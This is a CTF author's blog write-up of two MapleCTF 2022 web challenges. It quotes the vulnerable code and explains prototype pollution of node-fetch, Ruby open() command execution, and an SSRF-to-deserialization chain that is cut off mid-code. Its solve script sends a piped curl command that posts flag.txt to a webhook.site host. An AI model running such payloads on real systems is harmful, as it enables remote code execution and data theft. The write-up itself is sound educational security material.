@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Vie ">
+<meta name="description" content="MapleCTF 2022 ran this year to great success, which is fantastic given the tight timeframe we were operating on shortly after coming back from DEFCON 30. We held a beginner-friendly, UBC-local version back in January, so our endgame for this version was to make more creative and harder challenges that people hopefully enjoyed. I wrote 3 web challenges for this CTF: honksay, Viene Library and Art Gallery, the latter 2 I will detail here." />
+<meta name="keywords" content=", writeups, tls-poison, ssrf, web, prototype-pollution, insecure-deserialization, ftp" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#0c0c0d" />
+<link rel="canonical" href="https://jamvie.net/posts/2022/09/maplectf-2022-vies-challenges/" />
+
+
+    <title>
+        
+            MapleCTF 2022: Vie&#39;s challenges :: Vie 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://jamvie.net/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://jamvie.net/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://jamvie.net/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://jamvie.net/favicon-16x16.png">
+    <link rel="manifest" href="https://jamvie.net/site.webmanifest">
+    <link rel="mask-icon" href="https://jamvie.net/safari-pinned-tab.svg" color="#0c0c0d">
+    <link rel="shortcut icon" href="https://jamvie.net/favicon.ico">
+    <meta name="msapplication-TileColor" content="#0c0c0d">
+    <meta name="theme-color" content="">
+
+
+
+<meta itemprop="name" content="MapleCTF 2022: Vie&#39;s challenges">
+<meta itemprop="description" content="MapleCTF 2022 ran this year to great success, which is fantastic given the tight timeframe we were operating on shortly after coming back from DEFCON 30. We held a beginner-friendly, UBC-local version back in January, so our endgame for this version was to make more creative and harder challenges that people hopefully enjoyed. I wrote 3 web challenges for this CTF: honksay, Viene Library and Art Gallery, the latter 2 I will detail here."><meta itemprop="datePublished" content="2022-09-01T14:50:08-06:00" />
+<meta itemprop="dateModified" content="2022-09-01T14:50:08-06:00" />
+<meta itemprop="wordCount" content="2260"><meta itemprop="image" content="https://jamvie.net/images/ArtGallery.png">
+<meta itemprop="keywords" content="writeups,tls-poison,ssrf,web,prototype-pollution,insecure-deserialization,ftp," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://jamvie.net/images/ArtGallery.png"/>
+
+<meta name="twitter:title" content="MapleCTF 2022: Vie&#39;s challenges"/>
+<meta name="twitter:description" content="MapleCTF 2022 ran this year to great success, which is fantastic given the tight timeframe we were operating on shortly after coming back from DEFCON 30. We held a beginner-friendly, UBC-local version back in January, so our endgame for this version was to make more creative and harder challenges that people hopefully enjoyed. I wrote 3 web challenges for this CTF: honksay, Viene Library and Art Gallery, the latter 2 I will detail here."/>
+
+
+
+
+
+    <meta property="article:section" content="writeups" />
+
+
+
+    <meta property="article:published_time" content="2022-09-01 14:50:08 -0600 MDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://jamvie.net/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ echo &#39;hello&#39;</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#fd262d;
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://jamvie.net/about/">About Me</a></li><li><a href="https://jamvie.net/categories/">Categories</a></li><li><a href="https://jamvie.net/notes/">Notes</a></li><li><a href="https://jamvie.net/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-176711986-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>11 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://jamvie.net/posts/2022/09/maplectf-2022-vies-challenges/">MapleCTF 2022: Vie&rsquo;s challenges</a>
+            </h1>
+                <hr />
+                <aside id="toc">
+                <div class="toc-title">Table of Contents</div>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#viene-library-11-solves">Viene Library (11 solves)</a>
+      <ul>
+        <li><a href="#step-0-whats-in-the-code">Step 0: What&rsquo;s in the code?</a></li>
+        <li><a href="#step-1-proto-pollution-and-node-fetch">Step 1: Proto-pollution and node-fetch</a></li>
+        <li><a href="#step-2-ruby-open">Step 2: Ruby open()</a></li>
+      </ul>
+    </li>
+    <li><a href="#art-gallery-3-solves">Art Gallery (3 solves)</a>
+      <ul>
+        <li><a href="#step-0-wtf-does-this-code-do">Step 0: WTF does this code do</a></li>
+        <li><a href="#step-1-tls-poison">Step 1: TLS Poison</a></li>
+        <li><a href="#step-2-ftp-ssrf">Step 2: FTP SSRF</a></li>
+        <li><a href="#step-3-redis-ssrf">Step 3: Redis SSRF</a></li>
+        <li><a href="#step-4-fleg">Step 4: Fleg</a></li>
+        <li><a href="#notes">Notes</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </aside>
+                <hr />
+
+            
+
+            <div class="post-content">
+                <p>MapleCTF 2022 ran this year to great success, which is fantastic given the tight timeframe we were operating on shortly after coming back from DEFCON 30. We held a beginner-friendly, UBC-local version back in January, so our endgame for this version was to make more creative and harder challenges that people hopefully enjoyed. I wrote 3 web challenges for this CTF: honksay, Viene Library and Art Gallery, the latter 2 I will detail here. I hope you enjoyed them if you played!</p>
+<h2 id="viene-library-11-solves">Viene Library (11 solves)</h2>
+<p>Viene Library was a challenge I thought of using my &ldquo;flag first&rdquo; design template - where I think of the flag value and make a whole challenge around it. :&gt;</p>
+<p>I guess no one remembers vine anymore cause I don&rsquo;t think anyone remembered the references I put in? Especially the flag value, which was this <a href="https://www.youtube.com/watch?v=nSYiyg8LGzY">vine in particular (WARNING: profanity)</a>.</p>
+<p>Anyway, crisis and nostalgia aside, Viene Library was predicated on combining <em>my favourite bug</em> prototype pollution and some cute and quirky things about how HTTP Rails servers operate.</p>
+<h3 id="step-0-whats-in-the-code">Step 0: What&rsquo;s in the code?</h3>
+<p>The public facing server was a NodeJS one that would call back to a Ruby Rails server asking for txt files served from the filesystem - these txt files were my vine poems, or my &ldquo;vienes&rdquo;. Both servers were in the same network in the same container. Only the NodeJS one was publicly accessible on port 8080.</p>
+<p><em>viene_controller.rb</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">VieneController</span> <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">ApplicationController</span>
+</span></span><span style="display:flex;"><span>    protect_from_forgery <span style="color:#e6db74">with</span>: <span style="color:#e6db74">:null_session</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>local?
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>put?
+</span></span><span style="display:flex;"><span>                request_body <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>body<span style="color:#f92672">.</span>read
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;{&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>, <span style="color:#e6db74">&#39;~&#39;</span>, <span style="color:#e6db74">&#39;[&#39;</span>, <span style="color:#e6db74">&#39;]&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span><span style="color:#f92672">].</span>include?(request_body)
+</span></span><span style="display:flex;"><span>                    render <span style="color:#e6db74">json</span>: {<span style="color:#e6db74">&#34;ERROR&#34;</span>: <span style="color:#e6db74">&#34;BAD HACKER&#34;</span>}
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>                viene <span style="color:#f92672">=</span> open(request_body)
+</span></span><span style="display:flex;"><span>                render <span style="color:#e6db74">json</span>: {<span style="color:#e6db74">&#34;chosen_viene&#34;</span>: viene}
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elsif</span> request<span style="color:#f92672">.</span>post?
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;1.txt&#39;</span>, <span style="color:#e6db74">&#39;2.txt&#39;</span>, <span style="color:#e6db74">&#39;3.txt&#39;</span><span style="color:#f92672">].</span>include?(request<span style="color:#f92672">.</span>body<span style="color:#f92672">.</span>read)
+</span></span><span style="display:flex;"><span>                    render <span style="color:#e6db74">json</span>: {<span style="color:#e6db74">&#34;chosen_viene&#34;</span>: <span style="color:#e6db74">&#34;Error&#34;</span>, <span style="color:#e6db74">&#34;chosen_viene_link&#34;</span>: <span style="color:#e6db74">&#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ&#34;</span>}
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> 
+</span></span><span style="display:flex;"><span>                    fullname <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;app&#34;</span>,<span style="color:#e6db74">&#34;assets&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>rand(<span style="color:#ae81ff">1</span><span style="color:#f92672">..</span><span style="color:#ae81ff">3</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.txt&#34;</span>)
+</span></span><span style="display:flex;"><span>                    viene <span style="color:#f92672">=</span> <span style="color:#66d9ef">File</span><span style="color:#f92672">.</span>read(fullname)
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">#memes</span>
+</span></span><span style="display:flex;"><span>                    viene_poem <span style="color:#f92672">=</span> viene<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&gt;&#39;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">1</span><span style="color:#f92672">].</span>strip
+</span></span><span style="display:flex;"><span>                    viene_url <span style="color:#f92672">=</span> viene<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&gt;&#39;</span>)<span style="color:#f92672">[</span><span style="color:#ae81ff">0</span><span style="color:#f92672">].</span>strip
+</span></span><span style="display:flex;"><span>                    render <span style="color:#e6db74">json</span>: {<span style="color:#e6db74">&#34;chosen_viene&#34;</span>: viene_poem, <span style="color:#e6db74">&#34;chosen_viene_link&#34;</span>: viene_url}
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                render <span style="color:#e6db74">json</span>: {<span style="color:#e6db74">&#34;ERROR&#34;</span>: <span style="color:#e6db74">&#34;I didn&#39;t understand the request...&#34;</span>}
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> 
+</span></span><span style="display:flex;"><span>            render <span style="color:#e6db74">json</span>: {<span style="color:#e6db74">&#34;ERROR&#34;</span>: <span style="color:#e6db74">&#34;Ur not local...&#34;</span>}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span></code></pre></div><p>The Rails server had only one purpose: to serve you vienes. If it recieved a POST request it would give you the appropriate viene if the filename you gave it in the POST was valid, else it would just give you a randomized one. If you gave it a PUT, you could open whatever you want.</p>
+<p>I literally mean whatever you want. Ruby&rsquo;s native <code>open</code> call can open a <a href="https://apidock.com/ruby/Kernel/open">subprocess</a> and pipe whatever you specify into that subprocess if the argument you pass to <code>open</code> starts with a single pipe (<code>|</code>) character. This is insta-RCE, but of course, only accessible to us if we make a valid PUT request. However&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//Recieve random viene from my &#34;database&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">rand</span> <span style="color:#f92672">=</span> (Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>()<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>))<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">toString</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.txt&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">vieneSERVER</span>, {<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>, 
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">filename</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>})
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">resp</span>) =&gt; (<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">json</span>()))
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">template</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">chosen_viene</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">chosen_viene_link</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ&#34;</span>));
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/findaviene&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">viene</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">vieneSERVER</span>, {<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>, 
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">viene</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>})
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">resp</span>) =&gt; (<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">json</span>()))
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">data</span>) =&gt; {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">template</span>(<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">chosen_viene</span>, <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">chosen_viene_link</span>));
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">template</span>(<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ&#34;</span>));
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>In the nodeJS server, there are only 2 potential avenues where it talks to the Rails server, and neither are PUT requests. What do we do?</p>
+<p>Putting a pin on it we can take a look further in nodeJS:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">standardizeViene</span>(<span style="color:#a6e22e">template</span>, <span style="color:#a6e22e">viene</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">m</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">viene</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> (<span style="color:#a6e22e">viene</span>[<span style="color:#a6e22e">m</span>]) <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;object&#34;</span>, <span style="color:#66d9ef">typeof</span> (<span style="color:#a6e22e">template</span>[<span style="color:#a6e22e">m</span>]) <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;object&#34;</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">standardizeViene</span>(<span style="color:#a6e22e">template</span>[<span style="color:#a6e22e">m</span>], <span style="color:#a6e22e">viene</span>[<span style="color:#a6e22e">m</span>]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">template</span>[<span style="color:#a6e22e">m</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">viene</span>[<span style="color:#a6e22e">m</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">template</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">vienesubs</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/submitaviene&#34;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">newviene</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//Standardize submission
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">viene_template</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">10</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>)
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//I&#39;ll look at it later
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">vienesubs</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">standardizeViene</span>(<span style="color:#a6e22e">viene_template</span>, <span style="color:#a6e22e">newviene</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Thanks! Your submission has been dropped into our pool succesfully. We&#39;ll let you know if we consider it!&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>If you POST <code>/submitaviene</code> you could have your request body be standardized with <code>standardizeViene</code> which has a crystal clear proto pollution vulnerability. Keeping this in mind, we can take note of the fact that the server uses <a href="https://www.npmjs.com/package/node-fetch">node-fetch</a> to make requests back to the Rails server, and so our attack plan is formulated:</p>
+<pre tabindex="0"><code>1. Proto-pollute node-fetch to PUT to Rails server
+2. Ruby open() for RCE and get flog
+</code></pre><h3 id="step-1-proto-pollution-and-node-fetch">Step 1: Proto-pollution and node-fetch</h3>
+<p><a href="https://portswigger.net/research/widespread-prototype-pollution-gadgets">Recent research</a> showcases that the object you pass into the fetch API can be proto-polluted with all the methods and fields you could stipulate to a fetch request (including node-fetch). For us, the ideal candidate here is the <code>headers</code> field, since the <code>method</code> field was explicitly declared in either node-fetch request so we couldn&rsquo;t proto-pollute that.</p>
+<p>The header I was thinking of was the <code>X-HTTP-Method-Override</code> header set to <code>PUT</code>, however I noticed some teams use <code>Content-Type</code> instead and set it to <code>application/x-www-form-urlencoded</code>, and adding <code>_method: PUT</code> in the form data to achieve the same effect.</p>
+<p>Either way, proto-polluting headers with either will make <a href="https://www.rubydoc.info/gems/rack/Rack/MethodOverride">Rails interpret the request</a> it recieves as a <code>PUT</code> instead of a <code>POST</code> regardless if whether or not the method field stated it was a <code>POST</code>.</p>
+<h3 id="step-2-ruby-open">Step 2: Ruby open()</h3>
+<p>Now that you&rsquo;re in the PUT logic of the viene controller in the Rails server, you get free RCE.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>VIENE_URL_SUBMIT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://vienelibrary.ctf.maplebacon.org/submitaviene&#39;</span>
+</span></span><span style="display:flex;"><span>VIENE_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://vienelibrary.ctf.maplebacon.org/findaviene&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>put_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;__proto__&#34;</span>: {<span style="color:#e6db74">&#34;headers&#34;</span>: {<span style="color:#e6db74">&#34;X-HTTP-Method-Override&#34;</span>: <span style="color:#e6db74">&#34;PUT&#34;</span>}}}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;viene&#34;</span>:<span style="color:#e6db74">&#34;|curl https://webhook.site/f6a4aed1-64b2-4b8e-bb60-a970842d6c24 --data </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">$(cat flag.txt)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(VIENE_URL_SUBMIT, json<span style="color:#f92672">=</span>put_data)
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(VIENE_URL, json<span style="color:#f92672">=</span>payload)
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>Someone please affirm me and say they remember vine.</p>
+<h2 id="art-gallery-3-solves">Art Gallery (3 solves)</h2>
+<p>Art Gallery was my most convoluted web challenge which is semi-inspired by Harmony Chat (DragonCTF 2020) and Contrived Web Problem (PlaidCTF 2020). Shoutout to our sponsor for the #sponsorship-debugging help. :&gt;</p>
+
+    <img src="https://jamvie.net/images/ArtGallery.png"  alt="My Art Gallery"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Here is the TL;DR -</p>
+<pre tabindex="0"><code>1. Slightly modified TLS poison to SSRF the FTP server
+2. Use FTP server to SSRF an &#34;image file&#34; containing Redis commands to the Redis server via RESP
+3. &#34;image file&#34; overwrites a user&#39;s sessional key with a node-serialize payload which fires when user visits site
+4. flag
+</code></pre><h3 id="step-0-wtf-does-this-code-do">Step 0: WTF does this code do</h3>
+<p>The general idea of the app was as so:</p>
+<ul>
+<li>An image gallery that you could upload your own pictures to</li>
+<li>The images were served via FTP</li>
+<li>Session management was done via Redis, storing your art token and an array of filenames to retrieve from FTP, which were serialized for ease of storage</li>
+</ul>
+<p>This challenge had alot of moving parts, so we will examine each individually to see how they all work together.</p>
+<h4 id="insecure-deserialization-node-serialize">Insecure deserialization: node-serialize</h4>
+<p>Consult the following code:</p>
+<p><em>app.js</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">art_token</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">val</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">redisClient</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">`image_</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">art_token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//here
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data_arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>.<span style="color:#a6e22e">unserialize</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">redisClient</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">`image_</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">art_token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>));
